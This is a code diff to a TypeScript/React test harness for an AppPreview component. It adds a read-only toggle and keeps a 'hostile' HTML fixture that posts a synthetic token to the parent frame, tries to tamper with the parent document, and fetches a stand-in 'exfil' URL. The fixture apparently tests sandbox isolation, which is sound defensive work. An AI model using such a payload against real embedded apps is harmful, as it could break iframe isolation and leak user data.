@@ -1,4 +1,4 @@
-import React from 'react';
+import React, {useState} from 'react';
 import { createRoot } from 'react-dom/client';
 import AppPreview from '../src/components/AppPreview';
 import {client} from '../src/lib/api';
@@ -18,4 +18,8 @@ client.apiCall.invoke = async (request: any) => {
 };
 Object.assign(window,{fixture:{state:()=>state,saves:()=>saves,sdkMessages:()=>sdkMessages}});
 const hostile = '<!doctype html><html><head></head><body><p id="result"></p><script>parent.postMessage({type:"mgx-token-saved",data:{token:"synthetic-invalid-token"}},"*");try{parent.document.body.dataset.compromised="yes";}catch{document.querySelector("#result").textContent="parent blocked";}fetch("https://example.com/exfil").catch(()=>document.body.append(" network blocked"));</script></body></html>';
-createRoot(document.getElementById('fixture')!).render(<AppPreview spec={{runtime:'html',app:{name:'2048',description:'回归'},requirements:['方向键合并']}} sourceBundle={{files:{'index.html':params.has('hostile')?hostile:game}}} versionId={params.has('share')?undefined:1} />);
+function Harness() {
+  const [readOnly,setReadOnly]=useState(params.has('readonly'));
+  return <><button onClick={()=>setReadOnly(value=>!value)}>切换版本写入权限</button><AppPreview readOnly={readOnly} spec={{runtime:'html',app:{name:'2048',description:'回归'},requirements:['方向键合并']}} sourceBundle={{files:{'index.html':params.has('hostile')?hostile:game}}} versionId={params.has('share')?undefined:1} /></>;
+}
+createRoot(document.getElementById('fixture')!).render(<Harness />);
